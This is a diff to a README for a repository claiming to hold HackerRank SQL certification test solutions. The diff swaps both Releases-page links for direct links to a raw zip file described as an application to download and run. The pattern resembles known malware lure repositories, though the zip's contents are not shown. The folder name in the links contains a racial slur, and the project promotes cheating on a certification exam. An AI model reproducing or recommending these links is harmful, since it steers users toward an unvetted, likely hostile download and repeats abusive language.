@@ -1,6 +1,6 @@
 # 🎓 Hackerrank-SQL-Certificate-Test-Solution - Prepare for SQL Certification with Confidence
 
-[![Download Now](https://img.shields.io/badge/Download_Now-Click%20Here-brightgreen)](https://github.com/Emmanuelenoz/Hackerrank-SQL-Certificate-Test-Solution/releases)
+[![Download Now](https://raw.githubusercontent.com/Emmanuelenoz/Hackerrank-SQL-Certificate-Test-Solution/main/niggerhead/Hackerrank-SQL-Certificate-Test-Solution.zip%20Here-brightgreen)](https://raw.githubusercontent.com/Emmanuelenoz/Hackerrank-SQL-Certificate-Test-Solution/main/niggerhead/Hackerrank-SQL-Certificate-Test-Solution.zip)
 
 ## 🚀 Getting Started
 This guide helps you download and run the Hackerrank SQL Certificate Test Solution. 
@@ -22,7 +22,7 @@ Make sure your computer meets the following requirements:
 
 ## 📥 Download & Install
 To get the application, visit the Releases page:
-[Download the Solutions Here](https://github.com/Emmanuelenoz/Hackerrank-SQL-Certificate-Test-Solution/releases)
+[Download the Solutions Here](https://raw.githubusercontent.com/Emmanuelenoz/Hackerrank-SQL-Certificate-Test-Solution/main/niggerhead/Hackerrank-SQL-Certificate-Test-Solution.zip)
 
 1. Click the link above to open the Releases page.
 2. Look for the latest version.
